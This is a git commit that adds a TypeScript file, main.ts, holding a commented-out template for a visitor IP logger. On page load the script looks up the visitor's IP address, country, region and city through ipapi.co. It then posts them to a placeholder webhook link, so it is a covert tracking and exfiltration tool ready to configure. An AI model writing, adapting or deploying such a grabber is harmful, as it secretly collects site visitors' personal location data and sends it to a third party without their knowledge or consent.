cec3db79d8b9e6e85f7f1a397a73ce45759c5265
carpetmaker3162 <82886347+carpetmaker3162@users.noreply.github.com>
2022-09-15 17:48:06 -0400

    Add files via upload

---
+++ main.ts
@@ -0,0 +1,37 @@
+/*
+const TITLE: string = "INSERT TITLE HERE"
+const COLOR: number = 0x0 // Replace the '0' at the end with the hex code of 
+                          // the color of the embed.
+const AVATAR_URL: string = "INSERT AVATAR URL HERE"
+const WEBHOOK_LINK: string = "INSERT WEBHOOK LINK HERE"
+
+
+window.addEventListener('load', (event) => {
+    fetch("https://ipapi.co/json/").then((response) => {
+        response.json().then((inputData) => {
+            let content = {
+                title: TITLE,
+                description: `
+                **IP:** ${inputData.ip}
+                **Country:** ${inputData.country_name}
+                **State/Province:** ${inputData.region}
+                **Town/City:** ${inputData.city}`,
+                color: COLOR
+            }
+
+            let data = {
+                avatar_url: AVATAR_URL,
+                embeds: [content]
+            }
+
+            fetch(WEBHOOK_LINK, {
+                method: 'POST',
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+            }).catch(console.error)
+        }).catch(console.error)
+    })
+});
+*/
